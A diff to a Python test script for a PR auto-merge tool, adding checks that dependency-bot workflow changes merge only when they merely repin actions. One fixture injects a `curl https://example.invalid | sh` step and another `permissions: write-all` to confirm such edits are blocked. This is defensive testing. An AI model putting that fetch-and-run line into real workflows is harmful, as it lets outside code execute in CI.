@@ -58,8 +58,8 @@ with open(f"{tmp}/cred/deepseek", "w") as f:
     f.write('DEEPSEEK_API_KEY=sk-test\nDEEPSEEK_MODEL="m-test"\n')
 with open(f"{tmp}/config.json", "w") as f:
     json.dump({
-        "owners": ["sam"], "exclude": [], "context": "review-settled", "rulesets": True, "keepBranches": [],
-        "baselineJobs": False, "baselinePerPass": 1, "authors": ["sam"], "codexLogin": "chatgpt-codex-connector",
+        "owners": ["sam"], "exclude": [], "renovateEmail": None, "context": "review-settled", "rulesets": True, "keepBranches": [],
+        "baselineJobs": False, "baselinePerPass": 1, "authors": ["sam", "dependabot", "renovate"], "codexLogin": "chatgpt-codex-connector",
         "stateDir": f"{tmp}/state", "projectsDir": f"{tmp}/none", "proj": "proj", "owner": "Sam", "cleanBranches": False,
         "labels": {"hold": "hold", "owner": "needs-owner"}, "notify": {"repo": "", "assignee": "", "label": "autoland"},
         "defaults": {"rounds": 5, "oneWay": [], "handoffAfter": 30, "settleDelay": 3, "codexTimeout": 45,
@@ -295,9 +295,14 @@ WROTE, RUNS, RESULT = [], [], {"v": "clean"}
 CUR = {"sha": head}  # the PR's head as the worker finds it
 
 
+PR_DIFF = {"v": ""}  # what `gh pr diff` gives
+
+
 def gh_stub(*a, **k):
     if a[:2] == ("api", "user"):
         return "sam"
+    if a[:2] == ("pr", "diff"):
+        return PR_DIFF["v"]
     if a[:2] == ("api", "repos/sam/r/pulls/5"):
         return {"state": "open", "sha": CUR["sha"]}
     return ""
@@ -511,3 +516,37 @@ for p in (".github/workflows/flake.yml", ".github/CODEOWNERS", ".github/dependab
 for p in ("secrets/remi.yaml", ".sops.yaml", "server/migrations/0002_users.sql"):
     assert S.one_way(touching(".github/workflows/flake.yml", p), {"oneWay": ONE_WAY}) == p, (p, ONE_WAY)
 print("one-way: ok")
+
+
+# A dependency bot's change to the gate: a workflow edit past repinning its
+# actions is reviewed like a Claude PR, since nothing else reads it; a pin
+# bump alone merges on green CI like any dependency update.
+def bump(diff, path=".github/workflows/ci.yml"):
+    PR_DIFF["v"] = diff
+    WROTE.clear()
+    pr = mkpr()
+    pr.update(number=12, headRefName="dependabot/github_actions/actions/checkout-4.2.0",
+              title="Bump actions/checkout from 4.1.0 to 4.2.0", author={"login": "dependabot"},
+              files={"nodes": [{"path": path}]})
+    S.save("pr-sam_r-12.json", {})
+    return run(pr, 4000)[0]
+
+
+PIN = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -5,1 +5,1 @@
+-      - uses: actions/checkout@1111111111111111111111111111111111111111 # v4.1.0
++      - uses: actions/checkout@2222222222222222222222222222222222222222 # v4.2.0
+"""
+status = bump(PIN)
+assert "Dependency update, CI green" in status and any("pr merge" in x for x in WROTE), (status, WROTE)
+for diff in (PIN + "+      - run: curl https://example.invalid | sh\n",
+             PIN.replace("# v4.2.0", "# v4.2.0\n+    permissions: write-all")):
+    status = bump(diff)
+    assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
+status = bump("")  # the diff couldn't be read
+assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
+status = bump(PIN, ".github/CODEOWNERS")
+assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
+print("gate edits: ok")
